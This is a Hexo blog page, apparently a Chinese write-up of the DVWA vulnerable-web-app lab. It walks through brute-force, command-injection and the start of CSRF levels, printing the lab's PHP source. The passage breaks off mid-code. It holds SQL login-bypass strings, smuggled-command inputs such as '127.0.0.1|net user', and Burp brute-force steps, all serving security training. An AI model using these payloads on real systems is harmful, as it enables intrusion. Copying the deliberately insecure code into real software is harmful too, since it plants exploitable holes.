@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>dvwa | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="第一题-Brute-Force 第二题-Command Injection 第三题-CSRF 第四题-File-Inclusion 第五题-File Upload 第六题-Insecure CAPTCHA 第七题-SQL-Injection 第八题-SQL Injection (Blind) 第九题-XSS (Reflected) 第十题-XSS (Stored) 第一题-Brute-Force">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa">
+<meta property="og:url" content="http://example.com/2021/02/26/dvwa/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="第一题-Brute-Force 第二题-Command Injection 第三题-CSRF 第四题-File-Inclusion 第五题-File Upload 第六题-Insecure CAPTCHA 第七题-SQL-Injection 第八题-SQL Injection (Blind) 第九题-XSS (Reflected) 第十题-XSS (Stored) 第一题-Brute-Force">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.3001.net/images/20161009/14760002264830.jpg!small">
+<meta property="og:image" content="https://image.3001.net/images/20161009/14760003309956.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161009/147600029633![]()!small">
+<meta property="og:image" content="https://image.3001.net/images/20161009/14760003769188.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161009/14760004176934.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161009/14760004593118.png!small">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938323-247510334.jpg">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155937317-848154105.jpg">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155939617-165513722.jpg">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938529-1012197189.jpg">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938064-1430455794.jpg">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938250-1479654924.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20161016/14765776616648.png!small">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190615092332469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190615092435426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://image.3001.net/images/20161031/14778952387559.png!small">
+<meta property="og:image" content="https://pics6.baidu.com/feed/bf096b63f6246b6063db7560e030c64a500fa218.png?token=3c675db8b5bea99d52b32d66762db004">
+<meta property="og:image" content="https://pics5.baidu.com/feed/2fdda3cc7cd98d109809c16c2cf7640879ec90d9.png?token=bf67d2385e4585ff9935704e348aea6e">
+<meta property="og:image" content="https://image.3001.net/images/20161031/1477895636890.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161031/14778956835405.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161031/14778957125554.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161106/14784220172185.png!small">
+<meta property="og:image" content="https://pics4.baidu.com/feed/48540923dd54564e458a3432b8164084d0584f19.png?token=8e0df337e643d14699f8db6f835c1bef">
+<meta property="og:image" content="https://pics4.baidu.com/feed/91529822720e0cf3165ae065028e2e19bc09aaca.png?token=d4a6d4ad5105c98fa81a5e9f0778d4cb">
+<meta property="og:image" content="https://pics2.baidu.com/feed/838ba61ea8d3fd1f21b1fa183a86f91994ca5fa2.png?token=a1414ce9fd591db547742e5071095679">
+<meta property="og:image" content="https://pics3.baidu.com/feed/d1a20cf431adcbefca128176bd67f2dba2cc9fef.png?token=d74cdf0e394b5f46d043286cb3c4e6f3">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190616173558550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190616173806526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785910509354.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785912161713.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/1478591243183.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785912718652.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785913093285.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/1478591344486.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785914897497.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/1478591669326![]()!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785917089423.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785917335700.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785917654899.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785919855138.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785920131063.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161108/14785921471182.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/1478762521859.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/1478762833724![]()!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/1478762911998.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/1478763222683.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/14787632525623.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/14787632811739.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/14787634573020.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/1478763487811![]()!small">
+<meta property="og:image" content="https://image.3001.net/images/20161110/14787635158708.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797983721114.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797984067767.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797984355690.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797985121733.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797985443503.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797985937424.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/1479801212675![]()!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/1479798808442.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797988504283.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797988815192.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797989187637.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797989528253.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797989786852.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797990065259.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797990363415.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14798013767789.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14798014536165.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161122/14797991619669.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824823248355.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824824105236.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824825209982.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824826941488.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824827265355.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824827533689.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824828493990.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824828893635.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/14824830099169.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20161223/1482483036879.png!small">
+<meta property="article:published_time" content="2021-02-26T15:14:04.000Z">
+<meta property="article:modified_time" content="2021-02-28T05:56:51.901Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.3001.net/images/20161009/14760002264830.jpg!small">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-dvwa" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/26/dvwa/" class="article-date">
+  <time datetime="2021-02-26T15:14:04.000Z" itemprop="datePublished">2021-02-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      dvwa
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="#%E7%AC%AC%E4%B8%80%E9%A2%98-Brute-Force">第一题-Brute-Force</a></p>
+<p><a href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-Command-Injection">第二题-Command Injection</a></p>
+<p><a href="#%E7%AC%AC%E4%B8%89%E9%A2%98-CSRF">第三题-CSRF</a></p>
+<p><a href="#%E7%AC%AC%E5%9B%9B%E9%A2%98File-Inclusion">第四题-File-Inclusion</a></p>
+<p><a href="#%E7%AC%AC%E4%BA%94%E9%A2%98-File-Upload">第五题-File Upload</a></p>
+<p><a href="%E7%AC%AC%E5%85%AD%E9%A2%98-Insecure-CAPTCHA">第六题-Insecure CAPTCHA</a></p>
+<p><a href="#%E7%AC%AC%E4%B8%83%E9%A2%98-SQL-Injection">第七题-SQL-Injection</a></p>
+<p><a href="#%E7%AC%AC%E5%85%AB%E9%A2%98-SQL-Injection-(Blind)">第八题-SQL Injection (Blind)</a></p>
+<p><a href="#%E7%AC%AC%E4%B9%9D%E9%A2%98-XSS-(Reflected)">第九题-XSS (Reflected)</a></p>
+<p><a href="#%E7%AC%AC%E5%8D%81%E9%A2%98-XSS-(Stored)">第十题-XSS (Stored)</a></p>
+<h1 id="第一题-Brute-Force"><a href="#第一题-Brute-Force" class="headerlink" title="第一题-Brute-Force"></a>第一题-Brute-Force</h1><p><img src="https://image.3001.net/images/20161009/14760002264830.jpg!small"></p>
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><?php
+
+if(isset($_GET['Login'])){
+//Getusername
+$user=$_GET['username'];
+
+//Getpassword
+$pass=$_GET['password'];
+$pass=md5($pass);
+
+//Checkthedatabase
+$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
+$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');
+
+if($result&&mysql_num_rows($result)==1){
+//Getusersdetails
+$avatar=mysql_result($result,0,"avatar");
+
+//Loginsuccessful
+echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
+echo"<imgsrc="{$avatar}"/>";
+}
+else{
+//Loginfailed
+echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
+}
+
+mysql_close();
+}
+
+?>
+<hr>
+<p>可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>（1）burpsuit<br>    第一步抓包<br><img src="https://image.3001.net/images/20161009/14760003309956.png!small"><br>    第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$<br><img src="https://image.3001.net/images/20161009/147600029633![]()!small"><br>    第三步选中Payloads，载入字典，点击Start attack进行爆破<br><img src="https://image.3001.net/images/20161009/14760003769188.png!small"><br>最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。<br><img src="https://image.3001.net/images/20161009/14760004176934.png!small"><br>(2)sql注入<br>万能密钥<br>admin’or ‘1’=’1<br>admin’ – -<br>admin’ # </p>
+<p>注入成功<br><img src="https://image.3001.net/images/20161009/14760004593118.png!small"></p>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><?php
+
+if(isset($_GET['Login'])){
+//Sanitiseusernameinput
+$user=$_GET['username'];
+$user=mysql_real_escape_string($user);
+
+//Sanitisepasswordinput
+$pass=$_GET['password'];
+$pass=mysql_real_escape_string($pass);
+$pass=md5($pass);
+
+//Checkthedatabase
+$query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
+$result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');
+
+if($result&&mysql_num_rows($result)==1){
+//Getusersdetails
+$avatar=mysql_result($result,0,"avatar");
+
+//Loginsuccessful
+echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
+echo"<imgsrc="{$avatar}"/>";
+}
+else{
+//Loginfailed
+sleep(2);
+echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
+}
+
+mysql_close();
+}
+
+?>
+<hr>
+<p>sql注入失效，但burtsuit仍然可用</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><?php
+
+if( isset( $_GET[ 'Login' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input
+    $user = $_GET[ 'username' ];
+    $user = stripslashes( $user );
+    $user = mysql_real_escape_string( $user );
+
+    // Sanitise password input
+    $pass = $_GET[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = mysql_real_escape_string( $pass );
+    $pass = md5( $pass );
+
+    // Check database
+    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
+
+    if( $result && mysql_num_rows( $result ) == 1 ) {
+        // Get users details
+        $avatar = mysql_result( $result, 0, "avatar" );
+
+        // Login successful
+        echo "<p>Welcome to the password protected area {$user}</p>";
+        echo "<img src=\"{$avatar}\" />";
+    }
+    else {
+        // Login failed
+        sleep( rand( 0, 3 ) );
+        echo "<pre><br />Username and/or password incorrect.</pre>";
+    }
+
+    mysql_close();
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p>可以发现，每次发送的时候，都带上了一个 user_token，每次发送请求的时候 user_token 都是会变的，而 user_token 是来自于上一个数据包的。<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938323-247510334.jpg"><br>使用burpsuit爆破</p>
+<p>依次选择【Project options】-&gt;【Sessions】-&gt;【add】-&gt; 【add a Rule Description】-&gt; 【Run a macro(宏)】</p>
+<p>选择新建宏<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155937317-848154105.jpg"><br>添加的时候，选择配置<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155939617-165513722.jpg"><br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938529-1012197189.jpg"></p>
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><?php
+
+if( isset( $_POST[ 'Login' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Sanitise username input
+    $user = $_POST[ 'username' ];
+    $user = stripslashes( $user );
+    $user = mysql_real_escape_string( $user );
+
+    // Sanitise password input
+    $pass = $_POST[ 'password' ];
+    $pass = stripslashes( $pass );
+    $pass = mysql_real_escape_string( $pass );
+    $pass = md5( $pass );
+
+    // Default values
+    $total_failed_login = 3;
+    $lockout_time       = 15;
+    $account_locked     = false;
+
+    // Check the database (Check user information)
+    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
+    $data->bindParam( ':user', $user, PDO::PARAM_STR );
+    $data->execute();
+    $row = $data->fetch();
+
+    // Check to see if the user has been locked out.
+    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
+        // User locked out.  Note, using this method would allow for user enumeration!
+        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";
+
+        // Calculate when the user would be allowed to login again
+        $last_login = $row[ 'last_login' ];
+        $last_login = strtotime( $last_login );
+        $timeout    = strtotime( "{$last_login} +{$lockout_time} minutes" );
+        $timenow    = strtotime( "now" );
+
+        // Check to see if enough time has passed, if it hasn't locked the account
+        if( $timenow > $timeout )
+            $account_locked = true;
+    }
+
+    // Check the database (if username matches the password)
+    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
+    $data->bindParam( ':user', $user, PDO::PARAM_STR);
+    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
+    $data->execute();
+    $row = $data->fetch();
+
+    // If its a valid login...
+    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
+        // Get users details
+        $avatar       = $row[ 'avatar' ];
+        $failed_login = $row[ 'failed_login' ];
+        $last_login   = $row[ 'last_login' ];
+
+        // Login successful
+        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
+        echo "<img src=\"{$avatar}\" />";
+
+        // Had the account been locked out since last login?
+        if( $failed_login >= $total_failed_login ) {
+            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
+            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
+        }
+
+        // Reset bad login count
+        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
+        $data->bindParam( ':user', $user, PDO::PARAM_STR );
+        $data->execute();
+    }
+    else {
+        // Login failed
+        sleep( rand( 2, 4 ) );
+
+        // Give the user some feedback
+        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";
+
+        // Update bad login count
+        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
+        $data->bindParam( ':user', $user, PDO::PARAM_STR );
+        $data->execute();
+    }
+
+    // Set the last login time
+    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
+    $data->bindParam( ':user', $user, PDO::PARAM_STR );
+    $data->execute();
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><p>错误三次后会锁定15分钟以上</p>
+<p>burp爆破关键词<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938064-1430455794.jpg"><br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938250-1479654924.jpg"></p>
+<h1 id="第二题-Command-Injection"><a href="#第二题-Command-Injection" class="headerlink" title="第二题-Command-Injection"></a>第二题-Command-Injection</h1><p><img src="https://image.3001.net/images/20161016/14765776616648.png!small"></p>
+<h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Submit' ]  ) ) { 
+
+    // Get input 
+
+    $target = $_REQUEST[ 'ip' ]; 
+
+    // Determine OS and execute the ping command. 
+
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
+
+        // Windows 
+
+        $cmd = shell_exec( 'ping  ' . $target ); 
+
+    } 
+
+    else { 
+
+        // *nix 
+
+        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
+
+    } 
+
+    // Feedback for the end user 
+
+    echo "<pre>{$cmd}</pre>"; 
+
+} 
+
+?><h2 id="-2"><a href="#-2" class="headerlink" title=" "></a> </h2><p>相关函数介绍 </p>
+<p>stristr(string,search,before_search)</p>
+<p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为”false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p>
+<p>php_uname(mode)</p>
+<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
+<p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
+<p>漏洞利用</p>
+<p>window和linux系统都可以用&amp;&amp;来执行多条命令</p>
+<p>127.0.0.1&amp;&amp;net user<br><img src="https://img-blog.csdnimg.cn/20190615092332469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
+<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Submit' ]  ) ) { 
+
+    // Get input 
+
+    $target = $_REQUEST[ 'ip' ]; 
+
+    // Set blacklist 
+
+    $substitutions = array( 
+
+        '&&' => '', 
+
+        ';'  => '', 
+
+    ); 
+
+    // Remove any of the charactars in the array (blacklist). 
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
+
+    // Determine OS and execute the ping command. 
+
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
+
+        // Windows 
+
+        $cmd = shell_exec( 'ping  ' . $target ); 
+
+    } 
+
+    else { 
+
+        // *nix 
+
+        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
+
+    } 
+
+    // Feedback for the end user 
+
+    echo "<pre>{$cmd}</pre>"; 
+
+} 
+
+?>
+<hr>
+<p>可以看到，相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。</p>
+<p>漏洞利用</p>
+<p>1、127.0.0.1&amp;net user</p>
+<p>因为被过滤的只有”&amp;&amp;”与” ;”，所以”&amp;”不会受影响。<br>  ![]<a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190615092359423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70">https://img-blog.csdnimg.cn/20190615092359423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70</a>)</p>
+<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><h2 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Submit' ]  ) ) { 
+
+    // Get input 
+
+    $target = trim($_REQUEST[ 'ip' ]); 
+
+    // Set blacklist 
+
+    $substitutions = array( 
+
+        '&'  => '', 
+
+        ';'  => '', 
+
+        '|  ' => '', 
+
+        '-'  => '', 
+
+        '$'  => '', 
+
+        '('  => '', 
+
+        ')'  => '', 
+
+        '`'  => '', 
+
+        '||' => '', 
+
+    ); 
+
+    // Remove any of the charactars in the array (blacklist). 
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 
+
+    // Determine OS and execute the ping command. 
+
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
+
+        // Windows 
+
+        $cmd = shell_exec( 'ping  ' . $target ); 
+
+    } 
+
+    else { 
+
+        // *nix 
+
+        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
+
+    } 
+
+    // Feedback for the end user 
+
+    echo "<pre>{$cmd}</pre>"; 
+
+} 
+
+?><h2 id="-3"><a href="#-3" class="headerlink" title=" "></a> </h2><p>漏洞利用</p>
+<p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p>
+<p>127.0.0.1|net user<br><img src="https://img-blog.csdnimg.cn/20190615092435426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
+<h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_POST[ 'Submit' ]  ) ) { 
+
+    // Check Anti-CSRF token 
+
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
+    // Get input 
+
+    $target = $_REQUEST[ 'ip' ]; 
+
+    $target = stripslashes( $target ); 
+
+    // Split the IP into 4 octects 
+
+    $octet = explode( ".", $target ); 
+
+    // Check IF each octet is an integer 
+
+    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { 
+
+        // If all 4 octets are int's put the IP back together. 
+
+        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 
+
+        // Determine OS and execute the ping command. 
+
+        if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
+
+            // Windows 
+
+            $cmd = shell_exec( 'ping  ' . $target ); 
+
+        } 
+
+        else { 
+
+            // *nix 
+
+            $cmd = shell_exec( 'ping  -c 4 ' . $target ); 
+
+        } 
+
+        // Feedback for the end user 
+
+        echo "<pre>{$cmd}</pre>"; 
+
+    } 
+
+    else { 
+
+        // Ops. Let the user name theres a mistake 
+
+        echo '<pre>ERROR: You have entered an invalid IP.</pre>'; 
+
+    } 
+
+} 
+
+// Generate Anti-CSRF token 
+
+generateSessionToken(); 
+
+?><h2 id="-4"><a href="#-4" class="headerlink" title=" "></a> </h2><h2 id="impossible等级，对命令注入行为正确防护。"><a href="#impossible等级，对命令注入行为正确防护。" class="headerlink" title="impossible等级，对命令注入行为正确防护。"></a>impossible等级，对命令注入行为正确防护。</h2><p>基础知识补充</p>
+<p>命令区别（&amp;、|、&amp;&amp;、||）</p>
+<p>&amp;起到连接命令的作用，不管前一条命令是否执行成功，下一条都会接着执行。</p>
+<p>|起到管道的作用，前一条命令的输出，作为下一条命令的输入，只打印最后一条命令的执行结果。</p>
+<p>&amp;&amp;表示当前面的命令执行成功后，它后面的命令才被执行<br>||表示前面的命令执行失败，它后面的命令才被执行</p>
+<hr>
+<h1 id="第三题-CSRF"><a href="#第三题-CSRF" class="headerlink" title="第三题-CSRF"></a>第三题-CSRF</h1><p><img src="https://image.3001.net/images/20161031/14778952387559.png!small"></p>
+<h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><hr>
+<?php 
+
+if( isset( $_GET[ 'Change' ] ) ) { 
+    // Get input 
+    $pass_new  = $_GET[ 'password_new' ]; 
+    $pass_conf = $_GET[ 'password_conf' ]; 
+
+    // Do the passwords match? 
+    if( $pass_new == $pass_conf ) { 
+        // They do! 
+        $pass_new = mysql_real_escape_string( $pass_new ); 
+        $pass_new = md5( $pass_new ); 
+
+        // Update the database 
